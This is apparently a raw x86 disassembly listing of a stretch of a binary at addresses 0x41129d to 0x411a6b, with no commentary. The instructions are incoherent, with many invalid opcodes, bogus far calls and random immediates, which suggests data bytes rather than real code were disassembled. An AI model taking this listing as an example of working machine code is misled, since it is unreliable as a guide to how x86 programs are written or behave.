  41129d:	stos   DWORD PTR es:[edi],eax
  41129e:	jno    0x411259
  4112a0:	call   0xaa7d:0x573798a7
  4112a7:	adc    dh,BYTE PTR [eax]
  4112a9:	and    al,0xed
  4112ab:	(bad)  
  4112ac:	adc    BYTE PTR [ebx+ebp*1+0x368d7cf4],bh
  4112b3:	and    edx,DWORD PTR [ebx]
  4112b5:	sbb    DWORD PTR [eax],edx
  4112b7:	jbe    0x411297
  4112b9:	adc    ch,bh
  4112bb:	je     0x411316
  4112bd:	inc    ebp
  4112be:	cmc    
  4112bf:	mov    dh,0x57
  4112c1:	daa    
  4112c2:	jmp    0x3d3ec915
  4112c7:	sbb    BYTE PTR [ebp-0x75],al
  4112ca:	(bad)  
  4112cb:	add    BYTE PTR [edx-0x4db99482],ch
  4112d1:	and    BYTE PTR [edi-0x2f],0xe
  4112d5:	into   
  4112d6:	aam    0xdd
  4112d8:	pop    edx
  4112d9:	dec    ebx
  4112da:	pop    edx
  4112db:	sar    ecx,1
  4112dd:	xchg   esi,eax
  4112de:	scas   eax,DWORD PTR es:[edi]
  4112df:	inc    edx
  4112e0:	sub    dh,BYTE PTR [ebx-0x4]
  4112e3:	rcl    BYTE PTR [edx-0x7627f503],0x27
  4112ea:	sbb    ebp,DWORD PTR [ebp+edx*8+0x70]
  4112ee:	or     esp,DWORD PTR [eax+edi*8]
  4112f1:	test   BYTE PTR [ecx-0x96e0bc],0x48
  4112f8:	inc    esp
  4112f9:	dec    edx
  4112fa:	or     ebp,DWORD PTR [esi]
  4112fc:	and    eax,0x537d699b
  411301:	jmp    0x8d57:0x3094880b
  411308:	test   BYTE PTR [ecx-0x1c],bl
  41130b:	xchg   esi,eax
  41130c:	pop    ebx
  41130d:	push   eax
  41130e:	sub    eax,0xd315f31b
  411313:	out    dx,eax
  411314:	xchg   edi,eax
  411315:	lea    ecx,[edi+0x7f51da35]
  41131b:	and    eax,0xc959b7a5
  411320:	mov    WORD PTR [edi],gs
  411322:	in     al,dx
  411323:	fucom  st(3)
  411325:	iret   
  411326:	jle    0x4112c2
  411328:	mov    gs,esi
  41132a:	cmp    eax,0x424e1a8f
  41132f:	push   esp
  411330:	sub    al,0x46
  411332:	imul   ecx,DWORD PTR [edi+ebp*1],0xffffff99
  411336:	pop    es
  411337:	or     bl,BYTE PTR [edx-0x1c]
  41133a:	call   0x28cf:0x1bcb269b
  411341:	and    bh,BYTE PTR [esi+0x4359cb2]
  411347:	enter  0x4dc5,0x5
  41134b:	xchg   edi,eax
  41134c:	fld    TBYTE PTR [eax-0x33]
  41134f:	inc    ecx
  411350:	adc    eax,DWORD PTR [edx-0x64]
  411353:	push   edi
  411354:	fidiv  DWORD PTR [ecx+edi*1-0x187aa45a]
  41135b:	out    dx,al
  41135c:	retf   0x133
  41135f:	aam    0xab
  411361:	mov    edi,0x33a9c0fc
  411366:	neg    BYTE PTR [ebp-0x58]
  411369:	adc    ah,BYTE PTR [esi+0x6c86b247]
  41136f:	mov    BYTE PTR [ecx],bl
  411371:	fld    st(6)
  411373:	loopne 0x4113f4
  411375:	pop    ecx
  411376:	dec    eax
  411377:	xor    al,0x25
  411379:	je     0x4113f1
  41137b:	out    dx,al
  41137c:	in     eax,0x30
  41137e:	push   esi
  41137f:	mov    ds:0xb95c7dde,eax
  411384:	jb     0x4113b2
  411386:	fneni(8087 only) 
  411388:	pop    ebp
  411389:	jle    0x41138f
  41138b:	xchg   BYTE PTR [ecx-0xa],ah
  41138e:	and    al,0x98
  411390:	stc    
  411391:	into   
  411392:	mov    es,WORD PTR [esi+0x9]
  411395:	adc    ah,BYTE PTR [ebx]
  411397:	xchg   ebp,eax
  411398:	mov    ah,0xcf
  41139a:	xchg   ecx,eax
  41139b:	or     al,0x8
  41139d:	sub    esi,DWORD PTR [ebp+0x1e0c0974]
  4113a3:	inc    esi
  4113a4:	lods   al,BYTE PTR ds:[esi]
  4113a5:	ja     0x411374
  4113a7:	and    ch,BYTE PTR [ebp+0x6d]
  4113aa:	out    dx,eax
  4113ab:	imul   BYTE PTR [ecx]
  4113ad:	dec    esi
  4113ae:	xchg   DWORD PTR [edx-0x55],edi
  4113b1:	mov    ebx,0xc3d23b32
  4113b6:	dec    ebp
  4113b7:	mov    DWORD PTR [ecx+0x70],edi
  4113ba:	adc    eax,DWORD PTR [edi+0x21aa45bf]
  4113c0:	mov    ch,bh
  4113c2:	push   edx
  4113c3:	xor    esp,esp
  4113c5:	xchg   edx,eax
  4113c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113c7:	je     0x4113cf
  4113c9:	mov    ds:0x6765f1a1,eax
  4113ce:	push   ebp
  4113cf:	addr16 or al,0xf8
  4113d2:	sub    dh,BYTE PTR [edi]
  4113d4:	jmp    0x41140a
  4113d6:	stos   BYTE PTR es:[edi],al
  4113d7:	loopne 0x4113e6
  4113d9:	lods   al,BYTE PTR ds:[esi]
  4113da:	push   ds
  4113db:	or     al,0x4
  4113dd:	inc    ebx
  4113de:	mov    eax,DWORD PTR [eax+eiz*4-0x4362dfe6]
  4113e5:	int    0x32
  4113e7:	dec    edx
  4113e8:	mov    ds:0xb3b6d8be,al
  4113ed:	sbb    DWORD PTR [eax-0x23],ecx
  4113f0:	jae    0x4113f1
  4113f2:	aas    
  4113f3:	and    ah,ah
  4113f5:	int    0x55
  4113f7:	mov    esi,0x52acc21b
  4113fc:	jle    0x41144e
  4113fe:	sti    
  4113ff:	loope  0x411426
  411401:	nop
  411402:	push   eax
  411403:	inc    ecx
  411404:	push   edx
  411405:	cmp    al,0x87
  411407:	inc    edi
  411408:	xor    dh,dl
  41140a:	shr    ebx,cl
  41140c:	fldcw  WORD PTR [ebx-0x4b78a694]
  411412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411413:	aad    0x35
  411415:	cli    
  411416:	gs mov ah,0xf5
  411419:	icebp  
  41141a:	inc    BYTE PTR [esp+edi*8]
  41141d:	xchg   esp,eax
  41141e:	push   ebp
  41141f:	jnp    0x411421
  411421:	add    eax,0xe53fcda9
  411426:	ss inc esp
  411428:	ret    0x7091
  41142b:	js     0x411451
  41142d:	xchg   esi,eax
  41142e:	and    ch,al
  411430:	push   ss
  411431:	and    DWORD PTR [eax+edi*8+0x16],edi
  411435:	xor    DWORD PTR [ebp+0x43e45fa0],ebx
  41143b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41143c:	scas   al,BYTE PTR es:[edi]
  41143d:	scas   al,BYTE PTR es:[edi]
  41143e:	adc    BYTE PTR [ecx],cl
  411440:	sub    eax,0x2f8b35e5
  411445:	(bad)  
  411446:	push   ss
  411447:	sub    BYTE PTR ds:0x5df055a7,ch
  41144d:	pop    ds
  41144e:	add    al,0x72
  411450:	cmp    DWORD PTR [ebp+0x48],esi
  411453:	and    BYTE PTR [edx-0xf8561dc],al
  411459:	and    DWORD PTR ds:0x5c12ee33,0x6dbdd569
  411463:	push   edx
  411464:	xchg   ebx,eax
  411465:	xchg   edx,eax
  411466:	cwde   
  411467:	push   es
  411468:	dec    edi
  411469:	jno    0x411430
  41146b:	inc    ebp
  41146c:	cld    
  41146d:	xor    al,0x41
  41146f:	rcl    DWORD PTR [ecx+eax*1],0x52
  411473:	call   0xe3545f98
  411478:	lea    ebp,[edi]
  41147a:	xchg   ebx,eax
  41147b:	loopne 0x4114b7
  41147d:	ret    0x5de2
  411480:	daa    
  411481:	cmp    bl,BYTE PTR [eax]
  411483:	mov    edx,0xfff6597
  411488:	add    al,0xa4
  41148a:	xor    ch,al
  41148c:	dec    esi
  41148d:	fimul  WORD PTR [ecx+0x56b60066]
  411493:	stos   DWORD PTR es:[edi],eax
  411494:	sbb    ebp,edx
  411496:	add    esi,edx
  411498:	inc    esp
  411499:	cwde   
  41149a:	aam    0x2d
  41149c:	push   esp
  41149d:	sti    
  41149e:	or     DWORD PTR [ebx],edx
  4114a0:	dec    esi
  4114a1:	out    dx,al
  4114a2:	loopne 0x4114da
  4114a4:	int    0xbb
  4114a6:	inc    DWORD PTR [esi]
  4114a8:	clc    
  4114a9:	cmp    DWORD PTR [ebx],ebp
  4114ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114ac:	pop    ebx
  4114ad:	add    bh,0xca
  4114b0:	xor    cl,BYTE PTR [esi]
  4114b2:	dec    edx
  4114b3:	aam    0xeb
  4114b5:	sbb    BYTE PTR [esi-0x3a03b69c],dh
  4114bb:	sbb    DWORD PTR [esi],esi
  4114bd:	retf   
  4114be:	mov    ch,BYTE PTR [ebp+ecx*8-0x34]
  4114c2:	cwde   
  4114c3:	daa    
  4114c4:	cmp    esi,ecx
  4114c6:	cmp    eax,0x9a7e0104
  4114cb:	fild   WORD PTR [eax+0x14]
  4114ce:	ss test eax,0x26e0b90a
  4114d4:	xchg   edi,eax
  4114d5:	mov    ds,esi
  4114d7:	jnp    0x4114f2
  4114d9:	data16 mov dh,0xcc
  4114dc:	icebp  
  4114dd:	aam    0x99
  4114df:	and    dl,BYTE PTR gs:[edx]
  4114e2:	mov    ebx,0xe0016902
  4114e7:	pushf  
  4114e8:	in     al,0x28
  4114ea:	mov    edx,0x72511395
  4114ef:	lock idiv cl
  4114f2:	out    0x71,eax
  4114f4:	adc    bl,bl
  4114f6:	icebp  
  4114f7:	fcmovu st,st(5)
  4114f9:	xor    al,BYTE PTR [esi-0x28]
  4114fc:	inc    eax
  4114fd:	add    eax,0x8b2d1930
  411502:	mov    BYTE PTR [ebx+0x1eff3213],0x64
  411509:	daa    
  41150a:	adc    BYTE PTR [esi+0x2c944c1a],bh
  411510:	test   DWORD PTR [edx],esp
  411512:	pop    ecx
  411513:	shr    DWORD PTR [esi],0xb4
  411516:	push   edx
  411517:	ror    DWORD PTR [edx-0x297cd4a2],0xee
  41151e:	test   ebx,eax
  411520:	loop   0x4114ba
  411522:	aaa    
  411523:	test   DWORD PTR [eax+0x32],0x2469d2d5
  41152a:	mov    ds:0x51d57af0,al
  41152f:	mov    ch,0xd5
  411531:	jl     0x411504
  411533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411534:	bound  eax,QWORD PTR [ebx+0x13103ed8]
  41153a:	int3   
  41153b:	push   eax
  41153c:	jns    0x4114cd
  41153e:	(bad)  
  41153f:	hlt    
  411540:	mov    edx,0x68589095
  411545:	mov    ?,WORD PTR [esi]
  411547:	stos   DWORD PTR es:[edi],eax
  411548:	sub    al,BYTE PTR [ebx-0x6954af59]
  41154e:	xor    BYTE PTR [eax+edi*8+0x5e],cl
  411552:	std    
  411553:	xchg   ebp,eax
  411554:	cmp    eax,0x2fdab2be
  411559:	in     al,dx
  41155a:	cmc    
  41155b:	ins    BYTE PTR es:[edi],dx
  41155c:	mov    bh,0x38
  41155e:	lahf   
  41155f:	retf   0x6674
  411562:	pop    esi
  411563:	(bad)  
  411564:	das    
  411565:	push   ebx
  411566:	jne    0x41150b
  411568:	pop    ebx
  411569:	pop    ss
  41156a:	stc    
  41156b:	sub    DWORD PTR ds:0x79655bbb,0xc46a000b
  411575:	dec    ecx
  411576:	stc    
  411577:	pop    edx
  411578:	inc    ecx
  411579:	(bad)  
  41157a:	shl    BYTE PTR [ebx-0x1b],0x9f
  41157e:	pop    esi
  41157f:	sbb    DWORD PTR [edi],ecx
  411581:	iret   
  411582:	lods   eax,DWORD PTR ds:[esi]
  411583:	aas    
  411584:	push   ebx
  411585:	in     eax,0xbb
  411587:	add    al,0x8
  411589:	jge    0x41157d
  41158b:	hlt    
  41158c:	fisubr WORD PTR [eax-0x6336e580]
  411592:	cmp    al,0x14
  411594:	outs   dx,BYTE PTR ds:[esi]
  411595:	out    0x56,eax
  411597:	leave  
  411598:	jno    0x41155c
  41159a:	sub    al,0x59
  41159c:	mov    al,0x61
  41159e:	sbb    al,0x8b
  4115a0:	push   es
  4115a1:	or     dl,BYTE PTR [edi]
  4115a3:	sbb    ebx,DWORD PTR [esi-0x2e]
  4115a6:	push   eax
  4115a7:	pop    eax
  4115a8:	sbb    al,0x4b
  4115aa:	ja     0x4115c4
  4115ac:	mov    eax,0x3f674b7e
  4115b1:	inc    edx
  4115b2:	xchg   esp,eax
  4115b3:	dec    ecx
  4115b4:	mov    ecx,DWORD PTR [esi-0x6c]
  4115b7:	push   es
  4115b8:	add    al,0x37
  4115ba:	test   al,0x71
  4115bc:	imul   esi,esp,0x52
  4115bf:	pop    esp
  4115c0:	loope  0x4115dd
  4115c2:	fs push edi
  4115c4:	jae    0x41156a
  4115c6:	sahf   
  4115c7:	mov    bl,BYTE PTR [ebx-0x42840b6c]
  4115cd:	mov    eax,0x1dea56c9
  4115d2:	cli    
  4115d3:	mov    ecx,0xf7033206
  4115d8:	mov    BYTE PTR [ecx+0x72],al
  4115db:	xchg   ebp,ebx
  4115dd:	push   eax
  4115de:	sub    BYTE PTR [ecx-0x36],ch
  4115e1:	and    ebx,DWORD PTR [ecx]
  4115e3:	cli    
  4115e4:	repz push eax
  4115e6:	and    BYTE PTR ss:[edi],0x9e
  4115ea:	(bad)  
  4115eb:	fimul  DWORD PTR [edi]
  4115ed:	xor    al,0x5c
  4115ef:	add    cl,ch
  4115f1:	push   eax
  4115f2:	or     bl,ah
  4115f4:	cmp    dl,BYTE PTR [ebx-0x68294e20]
  4115fa:	fild   DWORD PTR [esp+edi*4]
  4115fd:	mov    ch,0x90
  4115ff:	gs xor al,0x82
  411602:	jmp    0xde8b:0x4d00ff85
  411609:	jae    0x4115e8
  41160b:	sub    ebx,DWORD PTR [edx-0x3b]
  41160e:	in     al,0x81
  411610:	add    eax,0x233cb8c7
  411615:	rol    BYTE PTR [eax-0x48],cl
  411618:	ror    DWORD PTR [eax+0x4f],1
  41161b:	or     esp,edi
  41161d:	sub    DWORD PTR [edi],esi
  41161f:	stc    
  411620:	stos   DWORD PTR es:[edi],eax
  411621:	call   0xebe5:0x6d47b3b8
  411628:	pop    ecx
  411629:	xchg   esp,eax
  41162a:	sub    eax,DWORD PTR [eax]
  41162c:	adc    cl,0xc
  41162f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411630:	mov    esp,0x2163ee41
  411635:	repnz imul esi,ebx,0x8b2fa821
  41163c:	jmp    DWORD PTR [eax+0x7e]
  41163f:	call   0x479b:0xab2173dc
  411646:	pop    edx
  411647:	xor    eax,0x64f6f0f4
  41164c:	std    
  41164d:	pop    es
  41164e:	jp     0x411612
  411650:	push   0x8e1bc1ab
  411655:	in     al,0xb6
  411657:	mov    ah,0x5a
  411659:	push   cs
  41165a:	adc    DWORD PTR [eax+0x5a],eax
  41165d:	mov    bh,0x38
  41165f:	sub    DWORD PTR [edx],0x11663ee1
  411665:	add    al,0xc7
  411667:	adc    DWORD PTR [edi],0xffffffb6
  41166a:	cmp    eax,DWORD PTR [ecx-0xf3d273c]
  411670:	icebp  
  411671:	jns    0x4116a6
  411673:	xchg   esp,edx
  411675:	and    BYTE PTR [ebp+0x509efe88],0x5a
  41167c:	call   0xdac0:0xb87f1258
  411683:	aad    0x7c
  411685:	pop    esi
  411686:	pop    ebx
  411687:	inc    edi
  411688:	nop
  411689:	push   ss
  41168a:	int3   
  41168b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41168c:	push   edi
  41168d:	mov    dl,0x8d
  41168f:	mov    ebx,0xe19bb68f
  411694:	xor    DWORD PTR [edx],edi
  411696:	mov    edi,0xa3efd101
  41169b:	inc    ebx
  41169c:	(bad)  
  41169d:	xor    cl,dh
  41169f:	shl    edi,0xa5
  4116a2:	(bad)  
  4116a3:	rol    DWORD PTR [esi-0x4e2a538f],1
  4116a9:	test   BYTE PTR [edi-0x2ffbeb4b],0x82
  4116b0:	fsub   st,st(3)
  4116b2:	push   0x49
  4116b4:	mov    eax,ds:0x448fda61
  4116b9:	or     eax,0xdd4077d5
  4116be:	and    esp,DWORD PTR ds:0xecbe003
  4116c4:	xchg   bh,ch
  4116c6:	or     al,0x58
  4116c8:	out    0xab,eax
  4116ca:	add    DWORD PTR [ebx-0x4388b2d9],0x1ff5b8e5
  4116d4:	mov    ch,0x13
  4116d6:	jp     0x41167e
  4116d8:	cdq    
  4116d9:	ret    
  4116da:	xor    al,0x96
  4116dc:	adc    dl,BYTE PTR fs:[edx-0x50]
  4116e0:	add    ebx,DWORD PTR [ebp-0x4c]
  4116e3:	data16 int 0x75
  4116e6:	test   eax,0xc8264d85
  4116ec:	cmp    eax,0xa1eca6af
  4116f1:	dec    esi
  4116f2:	pop    esp
  4116f3:	adc    edi,DWORD PTR [esi-0x1a]
  4116f6:	xchg   DWORD PTR [esi+0x16c1fd73],ecx
  4116fc:	iret   
  4116fd:	fist   DWORD PTR [edx]
  4116ff:	inc    eax
  411700:	or     DWORD PTR [esp+edi*8],ebp
  411703:	push   ebx
  411704:	lea    esi,[edx+0x25]
  411707:	sbb    al,0xe3
  411709:	out    0x36,al
  41170b:	fdivr  st(1),st
  41170d:	ficomp WORD PTR [esi-0x7f6088fe]
  411713:	shr    ebx,0xca
  411716:	lds    ebp,FWORD PTR ds:0x5d99a6ac
  41171c:	adc    cl,BYTE PTR [eax+0x67]
  41171f:	fidiv  DWORD PTR [edi+eiz*8-0x2a]
  411723:	xchg   ebp,eax
  411724:	xchg   BYTE PTR [edx+ecx*1+0x1e],ah
  411728:	mov    edx,DWORD PTR [ebx+0x64]
  41172b:	pop    es
  41172c:	(bad)  
  41172d:	cmc    
  41172e:	sub    BYTE PTR [eax],bl
  411730:	pop    eax
  411731:	push   0x1733375b
  411736:	lds    eax,FWORD PTR [ebx-0x7a]
  411739:	sbb    al,0xd1
  41173b:	adc    ch,BYTE PTR [ebp+0x69]
  41173e:	(bad)  
  41173f:	push   ss
  411740:	sub    eax,0x5648483f
  411745:	sbb    BYTE PTR [eax-0x23e3dcff],ch
  41174b:	dec    ebp
  41174c:	clc    
  41174d:	stc    
  41174e:	jno    0x4116e4
  411750:	mov    ebp,0x93e7b5aa
  411755:	xor    ebp,DWORD PTR [eax]
  411757:	pushf  
  411758:	sub    BYTE PTR [ebx+0x7fc74b09],0x26
  41175f:	mov    bl,0x1f
  411761:	outs   dx,BYTE PTR ds:[esi]
  411762:	and    ch,BYTE PTR [ecx+0x47132235]
  411768:	xchg   edx,eax
  411769:	jmp    0x3d195e14
  41176e:	mov    DWORD PTR es:[esi+0x18],edx
  411772:	fucomp st(3)
  411774:	dec    ecx
  411775:	push   0x61
  411777:	aas    
  411778:	cs leave 
  41177a:	xlat   BYTE PTR ds:[ebx]
  41177b:	or     BYTE PTR [esi],ah
  41177d:	ds aad 0xa7
  411780:	sub    dl,BYTE PTR [edi-0x71]
  411783:	dec    ebp
  411784:	cmp    al,0xfa
  411786:	mov    ah,BYTE PTR [edx]
  411788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411789:	cmp    al,0xe2
  41178b:	xchg   ebx,eax
  41178c:	cli    
  41178d:	loopne 0x41174f
  41178f:	jb     0x41178e
  411791:	jno    0x4117da
  411793:	push   es
  411794:	pushf  
  411795:	nop
  411796:	ror    DWORD PTR [edx+edi*8-0x1c],0xd
  41179b:	mov    esp,0x69d69e8b
  4117a0:	rcl    ecx,1
  4117a2:	dec    ebp
  4117a3:	cmp    eax,0xa3b83f33
  4117a8:	lds    ebp,FWORD PTR [edi-0x12]
  4117ab:	leave  
  4117ac:	and    DWORD PTR [esi-0x14],edx
  4117af:	mov    al,ds:0xe81fd080
  4117b4:	xchg   edi,eax
  4117b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117b6:	cli    
  4117b7:	and    esi,ebp
  4117b9:	pop    ebp
  4117ba:	fidiv  WORD PTR [esi+0x43]
  4117bd:	out    dx,al
  4117be:	mov    bh,0xa5
  4117c0:	dec    ebx
  4117c1:	push   edi
  4117c2:	outs   dx,BYTE PTR ds:[esi]
  4117c3:	dec    ebx
  4117c4:	call   0x3223:0xbdacc3c3
  4117cb:	mov    al,0xac
  4117cd:	lea    ebp,[esi+0x41]
  4117d0:	inc    ebx
  4117d1:	sub    al,0xb0
  4117d3:	addr16 in al,dx
  4117d5:	push   0x777a2965
  4117da:	sbb    esp,DWORD PTR [ecx]
  4117dc:	shl    BYTE PTR [ebx],1
  4117de:	std    
  4117df:	xor    edi,DWORD PTR [esi+0x1a]
  4117e2:	pop    ebp
  4117e3:	mov    ch,0xad
  4117e5:	scas   eax,DWORD PTR es:[edi]
  4117e6:	out    dx,al
  4117e7:	inc    ebx
  4117e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ea:	fldenv [ebx]
  4117ec:	lock fcmovnb st,st(4)
  4117ef:	mov    eax,0xa7df763
  4117f4:	and    al,0x65
  4117f6:	or     DWORD PTR [esp+ecx*8+0x15520960],edi
  4117fd:	add    DWORD PTR es:[edi-0x3ff33819],esi
  411804:	xlat   BYTE PTR ds:[ebx]
  411805:	xchg   esp,eax
  411806:	lea    eax,[edi-0x2f019788]
  41180c:	ins    BYTE PTR es:[edi],dx
  41180d:	push   eax
  41180e:	int3   
  41180f:	or     ch,BYTE PTR [ecx]
  411811:	mov    esp,0xec13168d
  411816:	lahf   
  411817:	inc    esp
  411818:	xchg   esi,eax
  411819:	(bad)  
  41181a:	retf   0x5419
  41181d:	repz and eax,0x6a8c81de
  411823:	add    ecx,esp
  411825:	jg     0x4117cb
  411827:	lds    esi,FWORD PTR [eax+ecx*1-0x6d]
  41182b:	mov    cl,0xfa
  41182d:	imul   ebp,DWORD PTR gs:[edx-0x6d],0x56
  411832:	test   DWORD PTR [esi],eax
  411834:	out    dx,eax
  411835:	mov    bh,0xb2
  411837:	jp     0x41189d
  411839:	dec    ebp
  41183a:	or     BYTE PTR [ebp+eax*8+0x1489915a],bl
  411841:	repz retf 
  411843:	inc    edi
  411844:	std    
  411845:	push   cs
  411846:	cmp    edx,eax
  411848:	pop    es
  411849:	adc    ebp,DWORD PTR [ebx+edx*2-0x67]
  41184d:	push   esi
  41184e:	sub    cl,0xad
  411851:	outs   dx,DWORD PTR ds:[esi]
  411852:	sbb    eax,0x4dd1d26c
  411857:	shr    DWORD PTR [edi-0x5],cl
  41185a:	cmc    
  41185b:	mov    esi,0x43158376
  411860:	nop
  411861:	xor    BYTE PTR [ecx-0x2c2472e5],0x6a
  411868:	and    BYTE PTR [edx+eax*2-0xb],ah
  41186c:	ficom  WORD PTR [esi+0x5a]
  41186f:	test   eax,0xcab9e7e1
  411874:	call   0x643f:0x5d75c918
  41187b:	pop    eax
  41187c:	jmp    0xfd14:0xaaaf15e3
  411883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411884:	add    eax,0x613f7c7c
  411889:	push   cs
  41188a:	jge    0x4118b8
  41188c:	sar    DWORD PTR [esi],0x72
  41188f:	out    0x9,eax
  411891:	inc    esp
  411892:	sbb    cl,cl
  411894:	cmp    eax,0x40bfb4b0
  411899:	xor    dl,BYTE PTR [esi]
  41189b:	add    eax,0xf6ccd3
  4118a0:	(bad)  
  4118a2:	add    ah,dh
  4118a4:	fcom   st(3)
  4118a6:	outs   dx,DWORD PTR ds:[esi]
  4118a7:	sbb    ebx,DWORD PTR ds:0xd05123b7
  4118ad:	popa   
  4118ae:	hlt    
  4118af:	inc    edx
  4118b0:	push   0x4d
  4118b2:	sbb    al,0xc7
  4118b4:	mov    esi,0x71540c02
  4118b9:	mov    ah,dh
  4118bb:	mov    edi,0x9e93f0c9
  4118c0:	mov    esp,0x46cb9799
  4118c5:	adc    esi,esi
  4118c7:	cmc    
  4118c8:	sbb    bh,BYTE PTR [esi+ecx*4+0x58e36bfc]
  4118cf:	push   esp
  4118d0:	push   esi
  4118d1:	and    al,0x62
  4118d3:	or     eax,0xf20730bc
  4118d8:	add    DWORD PTR [edx],ebp
  4118da:	push   0xf93df3c1
  4118df:	or     esp,edx
  4118e1:	xor    eax,0x5c18deb5
  4118e6:	call   DWORD PTR [edi]
  4118e8:	je     0x4118af
  4118ea:	das    
  4118eb:	ins    DWORD PTR es:[edi],dx
  4118ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ed:	jmp    0x4118d7
  4118ef:	jg     0x411884
  4118f1:	bound  esp,QWORD PTR [edx-0x7]
  4118f4:	in     eax,dx
  4118f5:	cdq    
  4118f6:	test   al,0x29
  4118f8:	popa   
  4118f9:	scas   al,BYTE PTR es:[edi]
  4118fa:	daa    
  4118fb:	push   ecx
  4118fc:	int3   
  4118fd:	in     al,0x25
  4118ff:	inc    ebp
  411900:	push   edx
  411901:	xor    esi,DWORD PTR [edx-0x194ed45e]
  411907:	adc    ebp,DWORD PTR [edi+0x34]
  41190a:	test   DWORD PTR [edi-0x7d],edx
  41190d:	fdiv   st,st(2)
  41190f:	shl    BYTE PTR fs:[ebx],cl
  411912:	mov    ds:0xdf3b6a63,al
  411917:	fadd   DWORD PTR [edx+0x764f9b2a]
  41191d:	or     ch,BYTE PTR [ebx+0x2c84d923]
  411923:	pushf  
  411924:	add    edi,DWORD PTR [esi-0x5d15e4b]
  41192a:	jno    0x41199f
  41192c:	cmp    DWORD PTR [ebp+0x3c429ca4],0x27
  411933:	jg     0x411924
  411935:	add    eax,0x1aadf482
  41193a:	ret    0xd423
  41193d:	push   0xffffffa2
  41193f:	mov    bl,0xcc
  411941:	cmp    BYTE PTR [edi-0x3fbe2c15],dh
  411947:	mov    ds:0x5f597f3b,al
  41194c:	fs jmp 0x41198c
  41194f:	stos   BYTE PTR es:[edi],al
  411950:	retf   0x9394
  411953:	pop    ds
  411954:	xor    al,0xb
  411956:	jae    0x4119cd
  411958:	jge    0x4119ae
  41195a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41195b:	xor    DWORD PTR [ecx+0x200092d5],eax
  411961:	push   ebp
  411962:	mov    edx,0xcac4fa38
  411967:	loop   0x411941
  411969:	pop    ss
  41196a:	add    al,0x53
  41196c:	jge    0x41192e
  41196e:	imul   edi,DWORD PTR [edx],0x2ce29e93
  411974:	in     al,dx
  411975:	inc    esp
  411976:	xor    BYTE PTR [esi+eiz*8],0xb4
  41197a:	imul   edx,eax,0xffffffee
  41197d:	or     al,0xdb
  41197f:	jle    0x4119e1
  411981:	push   ss
  411982:	cmp    al,bh
  411984:	adc    edi,DWORD PTR [eax]
  411986:	out    0x2d,eax
  411988:	std    
  411989:	retf   
  41198a:	jo     0x411966
  41198c:	mov    BYTE PTR [ebx],cl
  41198e:	mov    ch,0xdd
  411990:	inc    edx
  411991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411992:	xchg   ecx,eax
  411993:	scas   eax,DWORD PTR es:[edi]
  411994:	mov    edi,0xb0e97842
  411999:	hlt    
  41199a:	mov    ah,0x1c
  41199c:	sbb    DWORD PTR [ecx],0x5f
  41199f:	xlat   BYTE PTR ds:[ebx]
  4119a0:	imul   ecx,DWORD PTR [ebp+0x2b],0xffffff87
  4119a4:	and    al,0x65
  4119a6:	(bad)  
  4119a8:	cwde   
  4119a9:	or     BYTE PTR [edi-0x79],dl
  4119ac:	adc    eax,0xea582296
  4119b1:	cmp    WORD PTR [edx],di
  4119b4:	adc    esi,DWORD PTR [ebp+edi*8+0x50]
  4119b8:	add    eax,0xfc2c8db8
  4119bd:	mov    ah,0x72
  4119bf:	mov    dh,0xe7
  4119c1:	lods   eax,DWORD PTR ds:[esi]
  4119c2:	repz and bl,BYTE PTR [edx+ebx*2+0xf]
  4119c7:	ror    DWORD PTR [edx],0x6b
  4119ca:	out    0xd6,eax
  4119cc:	xor    DWORD PTR [eax+0x30afa43],esp
  4119d2:	and    DWORD PTR ds:0xec0587f5,0x281d8afa
  4119dc:	xor    eax,DWORD PTR [ebx+0x21]
  4119df:	mov    ah,0xec
  4119e1:	enter  0x7c32,0x62
  4119e5:	add    al,dl
  4119e7:	sub    DWORD PTR [edi-0x45],edx
  4119ea:	dec    esi
  4119eb:	xor    ch,dl
  4119ed:	dec    eax
  4119ee:	mov    cs,WORD PTR [ecx+ebp*1+0xa]
  4119f2:	(bad)  
  4119f3:	int3   
  4119f4:	and    eax,DWORD PTR [bp-0x3dad]
  4119f9:	arpl   cx,si
  4119fb:	and    BYTE PTR [ebp-0x16],0x7f
  4119ff:	mov    al,0x31
  411a01:	sub    BYTE PTR [ecx],dh
  411a03:	loope  0x411a5b
  411a05:	mov    edx,0x1e268804
  411a0a:	pop    ecx
  411a0b:	mov    ecx,0x985ec580
  411a10:	fild   DWORD PTR [esp+eax*8+0x2b]
  411a14:	cli    
  411a15:	ins    BYTE PTR es:[edi],dx
  411a16:	bound  ebp,QWORD PTR ds:0x69052c88
  411a1c:	or     al,0x56
  411a1e:	stos   BYTE PTR es:[edi],al
  411a1f:	mov    al,ds:0x57bf97c1
  411a24:	sub    BYTE PTR [ebp-0x13],0xbc
  411a28:	or     eax,0xc98b7de2
  411a2d:	or     BYTE PTR fs:[edx],ah
  411a30:	mov    ah,0x24
  411a32:	fnstenv [edi-0x35ccce50]
  411a38:	xor    BYTE PTR [edx+0x38a79470],al
  411a3e:	dec    ecx
  411a3f:	cli    
  411a40:	test   BYTE PTR [edx+0x3c],ah
  411a43:	out    dx,eax
  411a44:	jle    0x4119f9
  411a46:	(bad)  
  411a47:	mov    esi,0xaeeafdff
  411a4c:	int3   
  411a4d:	or     ch,ch
  411a4f:	sti    
  411a50:	(bad)  
  411a51:	jns    0x411ac3
  411a53:	cmp    eax,0x3470d529
  411a58:	xor    ebx,DWORD PTR [eax-0x8]
  411a5b:	ss sahf 
  411a5d:	les    ebx,FWORD PTR [ecx-0x2b]
  411a60:	jle    0x411aa9
  411a62:	cmp    al,0xe3
  411a64:	mov    DWORD PTR [ebx-0x5c8d17a1],eax
  411a6a:	push   ebp
  411a6b:	xor    al,0x73
